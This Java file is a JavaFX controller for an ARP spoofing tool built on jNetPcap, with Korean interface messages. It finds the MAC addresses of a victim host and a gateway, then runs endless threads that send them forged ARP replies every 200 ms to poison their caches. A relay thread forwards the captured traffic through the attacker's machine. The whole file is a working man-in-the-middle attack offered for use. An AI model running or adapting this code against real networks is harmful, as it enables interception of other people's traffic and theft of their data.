package controller;

import java.net.InetAddress;
import java.net.URL;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.ResourceBundle;

import org.jnetpcap.Pcap;
import org.jnetpcap.PcapHeader;
import org.jnetpcap.PcapIf;
import org.jnetpcap.nio.JBuffer;
import org.jnetpcap.nio.JMemory;
import org.jnetpcap.packet.JRegistry;
import org.jnetpcap.packet.PcapPacket;
import org.jnetpcap.protocol.lan.Ethernet;
import org.jnetpcap.protocol.network.Ip4;

import javafx.application.Platform;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.fxml.FXML;
import javafx.fxml.Initializable;
import javafx.scene.control.Button;
import javafx.scene.control.ListView;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;
import model.ARP;
import model.Util;

//handle view.fxml event
public class Controller implements Initializable {
	
	@FXML
	private ListView<String> networkListView;
	
	@FXML
	private TextArea textArea;
	
	@FXML
	private Button pickButton;
	
	@FXML
	private TextField myIP;
	
	@FXML
	private TextField senderIP;
	
	@FXML
	private TextField targetIP;
	
	@FXML
	private Button getMACButton;
	
	ObservableList<String> networkList = FXCollections.observableArrayList();
	
	//contains network devices
	private ArrayList<PcapIf> allDevs = null;
	
	@Override
	public void initialize(URL location, ResourceBundle resources) {
		allDevs = new ArrayList<PcapIf>();
		StringBuilder errbuf = new StringBuilder();
		
		//find network device
		int r= Pcap.findAllDevs(allDevs, errbuf);
		if (r==Pcap.NOT_OK || allDevs.isEmpty()) 
		{
			textArea.appendText("네트워크 장치를 찾을 수 없습니다. \n" + errbuf.toString() + "\n");
			return;
		}
		
		textArea.appendText("네트워크 장치를 찾았습니다. \n원하시는 장치를 선택해주세요. \n");
		//print about network device description
		for(PcapIf device : allDevs) 
		{
			networkList.add(device.getName() + " " +((device.getDescription()!=null)? device.getDescription():"설명 없음"));
		}
		networkListView.setItems(networkList);
	}
	
	//button to choose only one network device
	public void networkPickAction() {
		
		//not choose
		if(networkListView.getSelectionModel().getSelectedIndex()<0) 
		{
			return;
		}
		
		Main.device=allDevs.get(networkListView.getSelectionModel().getSelectedIndex());
		//lock listview
		networkListView.setDisable(true);
		//lock button
		pickButton.setDisable((true));
		
		int snaplen = 64* 1024;
		int flags=Pcap.MODE_PROMISCUOUS;
		int timeout=1;
		
		StringBuilder errbuf = new StringBuilder();
		//activate selected network device
		Main.pcap=Pcap.openLive(Main.device.getName(), snaplen, flags, timeout, errbuf);
		
		if (Main.pcap==null) 
		{
			textArea.appendText("네트워크 장치를 열 수 없습니다.\n"+ errbuf.toString()+"\n");
			return;
		}
		textArea.appendText("장치 선택 : "+Main.device.getName()+"\n");
		textArea.appendText("네트워크 장비를 활성화 하였습니다.\n");
	}
	
	//start ARP Spoofing
	//start button event
	public void getMACAction(){
		
		//not choose network device yet
		if(!pickButton.isDisable()) 
		{
			textArea.appendText("네트워크 장치를 먼저 선택해주세요. \n");
			return;
		}
		
		ARP arp=new ARP();
		Ethernet eth=new Ethernet();
		PcapHeader header = new PcapHeader(JMemory.POINTER);
		JBuffer buf=new JBuffer(JMemory.POINTER);
		ByteBuffer buffer=null;
		
		int id=JRegistry.mapDLTToId(Main.pcap.datalink());
		
		//input values by user
		try 
		{
			//selected network device MAC address
			Main.myMAC=Main.device.getHardwareAddress();
			Main.myIP=InetAddress.getByName(myIP.getText()).getAddress();
			
			//sender IP address , e.g) host, end node
			Main.senderIP=InetAddress.getByName(senderIP.getText()).getAddress();
			
			//target IP address , e.g) router
			Main.targetIP=InetAddress.getByName(targetIP.getText()).getAddress();
			
		} catch (Exception e) {
			textArea.appendText("IP주소가 잘못되었습니다.\n");
			return;
		}
		
		//lock labels
		myIP.setDisable(true);
		senderIP.setDisable(true);
		targetIP.setDisable(true);
		getMACButton.setDisable(true);
		
		arp=new ARP();
		arp.makeAPRRequest(Main.myMAC, Main.myIP, Main.targetIP);
		buffer=ByteBuffer.wrap(arp.getPacket());
		
		//send packet to know target's MAC address
		if (Main.pcap.sendPacket(buffer)!=Pcap.OK) 
		{
			System.out.println(Main.pcap.getErr());
		}
		textArea.appendText("타겟에게 ARP Request를 보냈습니다.\n"+ Util.bytesToString(arp.getPacket())+"\n");
		
		//for time measurement since sent packet
		long targetStartTime=System.currentTimeMillis(); 
		
		Main.targetMAC=new byte[6]; //변수 초기화
		
		//try to receive reply packet by target
		while (Main.pcap.nextEx(header, buf)!=Pcap.NEXT_EX_NOT_OK) 
		{ 
			//time out, not exits reply, occurred error
			if (System.currentTimeMillis()-targetStartTime>=500) {
				textArea.appendText("타겟이 응답하지 않습니다.\n");
				return;
			}
			
			PcapPacket packet=new PcapPacket(header, buf);
			packet.scan(id);
			
			//check source ip
			byte[] sourceIP=new byte[4];
			System.arraycopy(packet.getByteArray(0, packet.size()), 28, sourceIP, 0, 4);
			
			//check 12th byte, 13th byte of packet to see if it is ARP packet
			//check 20th byte, 21th byte of packet to see if it is ARP reply packet
			//check whether  souceIP and targetIP are equal
			//check for MAC address in header
			if (packet.getByte(12)==0x08 && packet.getByte(13)==0x06  && packet.getByte(20)==0x00 && packet.getByte(21)==0x02 
					&& Util.bytesToString(sourceIP).equals(Util.bytesToString(Main.targetIP)) && packet.hasHeader(eth)) 
			{
				Main.targetMAC=eth.source();
				break;
			} else 
			{
				continue;
			}
		}
		
		textArea.appendText("타겟 맥 주소: " + Util.bytesToString(Main.targetMAC) +"\n");
		
		//send packet to know sender's MAC address
		arp=new ARP();
		arp.makeAPRRequest(Main.myMAC, Main.myIP, Main.senderIP);
		buffer=ByteBuffer.wrap(arp.getPacket());
		
		if (Main.pcap.sendPacket(buffer)!=Pcap.OK) 
		{
			System.out.println(Main.pcap.getErr());
		}
		
		textArea.appendText("센더에게 ARP Request를 보냈습니다.\n"+
				Util.bytesToString(arp.getPacket())+"\n");
		
		long senderStartTime=System.currentTimeMillis();
		Main.senderMAC=new byte[6];
		
		//try to receive reply packet by sender
		while (Main.pcap.nextEx(header, buf)!=Pcap.NEXT_EX_NOT_OK) 
		{
			if (System.currentTimeMillis()-senderStartTime>=500) 
			{
				textArea.appendText("센더가 응답하지 않습니다.\n");
				return;
			}
			
			PcapPacket packet=new PcapPacket(header, buf); 
			packet.scan(id);
			byte[] sourceIP=new byte[4];
			
			System.arraycopy(packet.getByteArray(0, packet.size()), 28, sourceIP, 0, 4);
			if (packet.getByte(12)==0x08 && packet.getByte(13)==0x06 && packet.getByte(20)==0x00 && packet.getByte(21)==0x02 
					&& Util.bytesToString(sourceIP).equals(Util.bytesToString(Main.senderIP)) && packet.hasHeader(eth)) {//2계층 맥주소를 가지고 있는 패킷인지
				Main.senderMAC=eth.source();
				break;
			} else 
			{
				continue;
			}
		}
		textArea.appendText("센더 맥 주소: " +
				Util.bytesToString(Main.senderMAC) +"\n");
		
		//send malformed packet
		new SenderARPSpoofing().start();
		new TargetARPSpoofing().start();
		new ARPRelay().start();
	}
	
	class SenderARPSpoofing extends Thread { 
		@Override
		public void run() {
			ARP arp=new ARP();
			//trick sender node
			//target MAC -> attacker MAC (user who use this program)
			arp.makeAPRReply(Main.senderMAC, Main.myMAC, Main.myMAC, Main.targetIP, Main.senderMAC, Main.senderIP);
			
			//update view
			Platform.runLater(()-> { textArea.appendText("센더에게 감염된 ARP Reply 패킷을 계속해서 전송합니다.");});
			
			while(true) 
			{
				ByteBuffer buffer=ByteBuffer.wrap(arp.getPacket());
				Main.pcap.sendPacket(buffer);
				
				try 
				{
					Thread.sleep(200);
				} catch (Exception e) 
				{
					e.printStackTrace();
				}
			}
		}
	}
	
	class TargetARPSpoofing extends Thread { 
		@Override
		public void run() { 
			ARP arp=new ARP();
			//trick target node
			//sender MAC -> attacker MAC (user who use this program)
			arp.makeAPRReply(Main.targetMAC, Main.myMAC, Main.myMAC, Main.senderIP, Main.targetMAC, Main.targetIP);
			Platform.runLater(()-> {textArea.appendText("타겟에게 감염된 ARP Reply 패킷을 계속해서 전송합니다.");});
			while(true) 
			{
				ByteBuffer buffer=ByteBuffer.wrap(arp.getPacket());
				Main.pcap.sendPacket(buffer); 
				try 
				{
					Thread.sleep(200);
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}
	}
	
	class ARPRelay extends Thread {
		@Override
		public void run() 
		{
			Ip4 ip=new Ip4();
			PcapHeader header=new PcapHeader(JMemory.POINTER);
			JBuffer buffer=new JBuffer(JMemory.POINTER);
			Platform.runLater(()-> {textArea.appendText("ARP Realy를 진행합니다.\n");});
			
			while(Main.pcap.nextEx(header, buffer)!=Pcap.NEXT_EX_NOT_OK) 
			{
				PcapPacket packet=new PcapPacket(header, buffer);
				int id=JRegistry.mapDLTToId(Main.pcap.datalink());
				packet.scan(id);
				
				//capture packet
				byte[] data=packet.getByteArray(0, packet.size());
				byte[] tempD=new byte[6];
				byte[] tempS=new byte[6];
				
				System.arraycopy(data, 0, tempD, 0, 6); //destination MAC address
				System.arraycopy(data, 6, tempS, 0, 6); // source MAC address
				
				//exception
				if(Util.bytesToString(tempD).equals(Util.bytesToString(Main.myMAC)) && Util.bytesToString(tempS).equals(Util.bytesToString(Main.myMAC))) 
				{
					if(packet.hasHeader(ip)) 
					{
						if(Util.bytesToString(tempD).equals(Util.bytesToString(Main.myIP))) 
						{
							System.arraycopy(Main.targetMAC, 0, data, 0, 6);
							ByteBuffer buffer2=ByteBuffer.wrap(data); 
							Main.pcap.sendPacket(buffer2);
						}
					}
				}
				//send packets from sender to the target
				else if(Util.bytesToString(tempD).equals(Util.bytesToString(Main.myMAC)) && Util.bytesToString(tempS).equals(Util.bytesToString(Main.senderMAC))) 
				{
					if(packet.hasHeader(ip)) 
					{
							System.arraycopy(Main.targetMAC, 0, data, 0, 6);
							System.arraycopy(Main.myMAC, 0, data, 6, 6);
							ByteBuffer buffer2=ByteBuffer.wrap(data); 
							Main.pcap.sendPacket(buffer2);
					}
				}
				//send packets from target to the sender
				else if(Util.bytesToString(tempD).equals(Util.bytesToString(Main.myMAC)) && Util.bytesToString(tempS).equals(Util.bytesToString(Main.targetMAC))) 
				{
					if(packet.hasHeader(ip)) 
					{
						if(Util.bytesToString(ip.destination()).equals(Util.bytesToString(Main.senderIP))) 
						{
							System.arraycopy(Main.senderMAC, 0, data, 0, 6);
							System.arraycopy(Main.myMAC, 0, data, 6, 6);
							ByteBuffer buffer2=ByteBuffer.wrap(data); 
							Main.pcap.sendPacket(buffer2);
						}
					}
				}
				System.out.println(Util.bytesToString(buffer.getByteArray(0, buffer.size())));
			}
		}
	}
}